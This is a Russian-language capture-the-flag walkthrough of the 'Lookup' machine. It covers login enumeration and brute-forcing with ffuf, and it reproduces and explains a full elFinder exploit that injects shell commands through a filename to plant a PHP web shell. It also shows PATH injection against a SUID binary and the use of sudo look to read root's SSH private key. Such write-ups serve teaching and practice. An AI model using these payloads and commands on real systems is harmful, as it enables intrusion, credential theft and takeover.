# Lookup

### Необходимые навыки

- Обнаружение информационного раскрытия через разницу в сообщениях об ошибках
- Брутфорс веб-форм через Burp Suite / ffuf
- Работа с эксплойтами (elFinder RCE)
- Разбор декомпилированного C-псевдокода (Ghidra)
- PATH-инъекция для повышения привилегий
- Эксплуатация `look` через sudo (GTFOBins)

---

### Взятие шелла

Скан портов ничего необычного не показывает — открыты только 22 (SSH) и 80 (HTTP). Перехожу на сайт: там форма входа. Попробовала SQL-инъекции и пофаззила директории — без результата.

Решила поперебирать логины вручную и заметила кое-что интересное: при вводе `admin` сервер выдаёт `wrong password`, тогда как для несуществующих пользователей — `wrong username or password`. Это классическое информационное раскрытие: сервер фактически подтверждает существование аккаунта. Значит, можно брутфорсить пароли конкретно под `admin`.

Перехватываю запрос через Burp, подставляю `FUZZ` в поле пароля и запускаю ffuf:

```
ffuf -request req.txt -request-proto http -w rockyou.txt -fs <длина_стандартного_ответа>
```

На одном из паролей ответ отличается по размеру, но войти под admin с ним не выходит — пароль, судя по всему, принадлежит другому аккаунту. Применяю тот же приём, но теперь перебираю логины. ffuf находит пользователя `jose`, и связка `jose` + найденный пароль срабатывает.

После входа происходит редирект на `files.lookup.thm` — добавляю его в `/etc/hosts` и попадаю в файловый менеджер. Ничего ценного в файлах нет, зато виден сервис с конкретной версией:

<img width="489" height="115" alt="image" src="https://github.com/user-attachments/assets/35fd6ce0-7cae-47ac-a914-67a9f6afb517" />

На эту версию elFinder есть готовый эксплойт в Metasploit. Выбираю нужный модуль, заполняю опции:

```
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS     ip               yes       The target host(s)
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /elFinder/       yes       The base path to elFinder
VHOST      files.lookup.thm no        HTTP server virtual host
```

**Разбор эксплойта**

```python
import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print "Usage: python exploit.py [URL]"
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text

def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
       print "[+] Pwned! :)"
       print "[+] Getting the shell..."
       while 1:
           try:
               input = raw_input("$ ")
               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))
               print r.text
           except KeyboardInterrupt:
               sys.exit("\nBye kaker!")
    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    url = sys.argv[1]
    print "[*] Uploading the malicious image..."
    hash = upload(url, payload)
    print "[*] Running the payload..."
    imgRotate(url, hash)
    shell(url)

if __name__ == "__main__":
    main()
```

Механика работает в четыре этапа.

**1. Вредоносный payload в имени файла**

```python
payload = 'SecSignal.jpg;echo 3c3f... | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```

Имя файла специально сформировано как последовательность shell-команд, разделённых `;`. Когда сервер передаёт имя файла системной утилите (например, ImageMagick), оболочка разбивает его по `;` и выполняет каждый фрагмент отдельно. `xxd -r -p` декодирует hex-строку обратно в текст; результат — файл `SecSignal.php` с содержимым:

```php
<?php system($_GET["c"]); ?>
```

Финальный `echo SecSignal.jpg` нужен, чтобы скрипт обработки изображения не вернул ошибку.

**2. Загрузка файла и получение хэша (функция `upload`)**

POST-запрос к `connector.minimal.php` — стандартному бэкенду elFinder. Сервер сохраняет файл без валидации имени и возвращает внутренний идентификатор (`hash`), который понадобится для следующего шага.

**3. Триггер: поворот изображения (функция `imgRotate`)**

Запрос с `cmd=resize&mode=rotate` заставляет elFinder вызвать системную утилиту для обработки «изображения». Имя файла подставляется в командную строку — в этот момент оболочка выполняет встроенные команды и `SecSignal.php` появляется на сервере.

**4. Интерактивный шелл (функция `shell`)**

Скрипт проверяет наличие `SecSignal.php` по HTTP (код 200) и запускает цикл: читает команды из stdin и отправляет их на сервер через параметр `?c=...`.

Запускаю эксплойт, ловлю reverse shell.

---

### Взятие юзера

Оказываемся в терминале за пользователя `www-data`. Загружаю LinPEAS — сразу нахожу подозрительный SUID-бинарник:

```
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
```

Копирую на свою машину и разбираю в Ghidra:

```c
undefined8 main(void)
{
  int iVar1;
  FILE *pFVar2;
  ...
  puts("[!] Running 'id' command to extract the username and user ID (UID)");
  snprintf(local_e8, 100, "id");
  pFVar2 = popen(local_e8, "r");
  ...
  iVar1 = __isoc99_fscanf(pFVar2, "uid=%*u(%[^)])", local_128);
  if (iVar1 == 1) {
      pclose(pFVar2);
      snprintf(local_78, 100, "/home/%s/.passwords", local_128);
      pFVar2 = fopen(local_78, "r");
      ...
  }
}
```

Логика программы: выполнить `id`, извлечь имя пользователя из вывода и открыть файл `/home/<username>/.passwords`. Уязвимость очевидна — `id` вызывается по **относительному пути**. Если `env_reset` у sudo отключён (проверяем через `sudo -V`), можно подменить команду через PATH-инъекцию.

Создаю поддельный `id` в `/tmp`:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Запускаю `/usr/sbin/pwm` — бинарник вызывает наш скрипт, получает имя пользователя `think` и выводит содержимое `/home/think/.passwords`. Получаем пароль и заходим по SSH.

---

### Повышение привилегий до root

```bash
sudo -l
```

Можно запускать `/usr/bin/look` с правами root без пароля. `look` — утилита для поиска строк в отсортированном файле: она выводит все строки, начинающиеся с заданного префикса. При пустом префиксе выведет файл целиком. Читаем приватный SSH-ключ root:

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
```

Сохраняем ключ, выставляем нужные права и подключаемся:

```bash
chmod 600 rsa_id
ssh -i rsa_id root@<ip>
```

Флаг в кармане.
